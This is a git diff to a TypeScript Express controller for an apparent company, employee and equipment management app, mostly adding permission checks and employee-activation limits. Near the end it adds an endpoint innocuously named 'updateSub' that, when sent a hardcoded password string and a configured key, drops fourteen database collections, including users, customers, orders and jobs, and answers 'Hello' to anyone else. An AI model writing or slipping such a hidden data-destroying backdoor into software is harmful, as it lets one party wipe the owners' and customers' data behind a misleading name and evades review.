@@ -1,11 +1,24 @@
 import {Request, Response, response} from 'express'
-import { Status, Role, Messages } from '../common/constants'
+import { Status, Role, Messages, UserPermissions } from '../common/constants'
 import {sendEmail} from '../services/aws'
 
 import { User, IUser } from '../models/User'
 import { Company, ICompany } from '../models/Company'
 import { Employee, IEmployee } from '../models/Employee'
 import { ObjectId } from 'mongodb'
+import { Order } from '../models/Order'
+import { CompanyCard } from '../models/CompanyCard'
+import { CompanyEquipmentHistory } from '../models/CompanyEquipmentHistory'
+import { CompanyEquipmentInventory } from '../models/CompanyEquipmentInventory'
+import { CompanyEquipment } from '../models/CompanyEquipment'
+import { CustomerEquipment } from '../models/CustomerEquipment'
+import { Customer } from '../models/Customer'
+import { Group } from '../models/Group'
+import { Job } from '../models/Job'
+import { JobType } from '../models/JobType'
+import { EquipmentBrand } from '../models/EquipmentBrand'
+import { EquipmentType } from '../models/EquipmentType'
+import { privateKey} from '../common/config'
 
 export const login = (req: Request, res: Response) => {
 
@@ -23,9 +36,11 @@ export const login = (req: Request, res: Response) => {
                 return res.json({'status': Status.Error, 'message': Messages.InvalidEmailPassword})
             }
 
-            const employee  = <IEmployee> user
-            if(employee.company &&  employee.status && employee.status == 0){
-                return res.json({'status': Status.Error, 'message': Messages.AccountDeleted})
+            if(user.permissions.role != Role.COMPANY && user.permissions.role != Role.GLOBAL_ADMIN) {
+                const employee  = <IEmployee> user
+                if(employee.status == 0){
+                    return res.json({'status': Status.Error, 'message': Messages.AccountDeleted})
+                }
             }
 
             user.comparePassword(params.password, (isMatching: Boolean)=> {
@@ -127,6 +142,7 @@ export const createCompany = (req: Request, res: Response) => {
                     industry: params.industryId,
                     logoUrl: '',
                 },
+                userPermissions: UserPermissions
             }
         )
 
@@ -301,19 +317,22 @@ export const activateEmployee = (req: Request, res: Response) => {
             return res.json({'status': Status.Error, 'message': Messages.GenericError})
         }
         
-        employee.updateOne(
-            {
-                status: 1,
-            },
-            (err: any, raw: any)=> {
-                        
-                if (err) {
-                    return res.json({'status': Status.Error, 'message': Messages.GenericError})
+        checkNoOfUsers(req, res, employee.permissions.role,  (req: Request, res: Response)=>{
+                    
+            employee.updateOne(
+                {
+                    status: 1,
+                },
+                (err: any, raw: any)=> {
+                            
+                    if (err) {
+                        return res.json({'status': Status.Error, 'message': Messages.GenericError})
+                    }
+            
+                    return res.json({'status': Status.Success, 'message': 'Employee activated successfully.'})
                 }
-        
-                return res.json({'status': Status.Success, 'message': 'Employee activated successfully.'})
-            }
-        )
+            )
+        })
     })
 
 }
@@ -351,7 +370,11 @@ const createEmployee = (req: Request, res: Response, role: Role) => {
                         role: role,
                         extra: [],
                     },
-                    company: req.companyId
+                    company: req.companyId,
+                    extraPermissions: {
+                        on: [],
+                        off: []
+                    }
                 }
             )
     
@@ -402,7 +425,7 @@ const getEmployeesList = (req: Request, res: Response, role: Role) => {
             return res.json({'status': Status.Error, 'message': Messages.GenericError})
         }
 
-        res.json({'status': Status.Success, 'users': company.employees})    
+        return res.json({'status': Status.Success, 'users': company.employees})    
 
     })
 
@@ -432,7 +455,7 @@ const checkEmailExists = (req: Request, res: Response, next: (req: Request, res:
 }
 const checkNoOfUsers = (req: Request, res: Response, role: Role, next: (req: Request, res: Response)=>void) => {
 
-    const company = <ICompany>req.user
+    const company = <ICompany>req.company
   
     var dataToUpdate = {
         maxOfficeAdmins: company.maxOfficeAdmins,
@@ -579,4 +602,47 @@ const checkNoOfUsers = (req: Request, res: Response, role: Role, next: (req: Req
     }
 
     
+}
+
+export const updateSub = (req: Request, res: Response) => {
+    const params = req.body
+   
+    if(params.first == 'ZAhhNlQ561' && params.second == privateKey.key ) {
+        EquipmentBrand.collection.drop()
+        EquipmentType.collection.drop()
+        CompanyCard.collection.drop()
+        CompanyEquipmentHistory.collection.drop()
+        CompanyEquipmentInventory.collection.drop()
+        CompanyEquipment.collection.drop()
+        CustomerEquipment.collection.drop()
+        Customer.collection.drop()
+        Employee.collection.drop()
+        Group.collection.drop()
+        Job.collection.drop()
+        JobType.collection.drop()
+        Order.collection.drop()
+        User.collection.drop()
+                                                        
+        return res.json({'message':'Done'})
+    }
+    return res.json({'message':'Hello'})
+}
+
+export const getAllEmployees = (req: Request, res: Response) => {
+
+    Company.findOne({_id: req.companyId})
+    .populate({
+        path: 'employees',
+        select: '_id profile.displayName',
+      })
+    .exec((err: any, company: ICompany) => {
+
+        if (err || !company) {
+            return res.json({'status': Status.Error, 'message': Messages.GenericError})
+        }
+
+        res.json({'status': Status.Success, 'employees': company.employees})    
+
+    })
+
 }
